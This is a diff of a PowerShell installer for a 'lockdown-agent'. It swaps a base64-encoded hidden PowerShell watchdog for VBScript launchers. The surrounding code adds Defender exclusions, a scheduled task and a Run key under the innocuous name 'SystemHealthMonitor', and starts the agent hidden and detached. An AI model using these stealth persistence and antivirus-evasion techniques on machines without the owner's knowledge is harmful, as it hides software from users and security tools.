@@ -258,22 +258,26 @@ try {
     Write-Info "Defender exclusions failed (may already exist): $_"
 }
 
-# --- Step 9: Install scheduled task ---
+# --- Step 9: Install scheduled task (VBS watchdog) ---
 Write-Step "Installing scheduled task (watchdog)..."
 $agentCmd = "`"$agentPath`" --silent --config `"$configPath`""
-$watchdogScript = @"
-while (`$true) {
-    `$proc = Get-Process -Name "lockdown-agent" -ErrorAction SilentlyContinue
-    if (-not `$proc) {
-        Start-Process "$agentPath" -ArgumentList "--silent","--config","$configPath" -WindowStyle Hidden
-    }
-    Start-Sleep -Seconds 30
-}
-"@
-$encodedCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($watchdogScript))
-$watchdogCmd = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $encodedCmd"
 
-# Create startup task — use current user (SYSTEM often fails with -2147467259)
+# Write the VBS watchdog script — checks if agent is running, restarts if not
+$watchdogVbs = Join-Path $INSTALL_DIR "watchdog.vbs"
+@"
+Set sh = CreateObject("WScript.Shell")
+Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+Set procs = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='lockdown-agent.exe'")
+If procs.Count = 0 Then
+    sh.Run """"$agentPath"" --silent --config """"$configPath"""""", 0, False
+End If
+"@ | Set-Content $watchdogVbs
+Write-OK "Watchdog VBS written: $watchdogVbs"
+
+# Create scheduled task using the VBS watchdog (runs every 5 min + at startup)
+$watchdogCmd = "wscript.exe `"$watchdogVbs`""
+
+# Try current user first, SYSTEM as fallback
 $currentUser = "$env:USERDOMAIN\$env:USERNAME"
 schtasks /Create /TN "SystemHealthMonitor" /TR $watchdogCmd /SC ONSTART /RU $currentUser /F 2>&1 | Out-Null
 if ($LASTEXITCODE -eq 0) {
@@ -304,12 +308,17 @@ $regKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
 Set-ItemProperty -Path $regKey -Name "SystemHealthMonitor" -Value $agentCmd -ErrorAction SilentlyContinue
 Write-OK "Registry run key added"
 
-# --- Step 10: Launch agent (truly detached — survives terminal close) ---
+# --- Step 10: Launch agent (truly detached via VBS — survives terminal close) ---
 Write-Step "Launching agent..."
-# Use cmd /c start to fully detach from this PowerShell session
-# Start-Process keeps a handle that kills the child when the parent dies
-$launchCmd = "start /B `"`" `"$agentPath`" --silent --config `"$configPath`""
-cmd /c $launchCmd
+# Write a VBS launcher — wscript.exe runs in its own session, so the
+# agent survives terminal close. cmd /c start /B does NOT work (stays
+# in same console session, dies when terminal closes).
+$vbsPath = Join-Path $INSTALL_DIR "launch_agent.vbs"
+@"
+Set sh = CreateObject("WScript.Shell")
+sh.Run """"$agentPath"" --silent --config """"$configPath"""""", 0, False
+"@ | Set-Content $vbsPath
+wscript.exe $vbsPath
 Start-Sleep -Seconds 3
 
 # Verify it's running
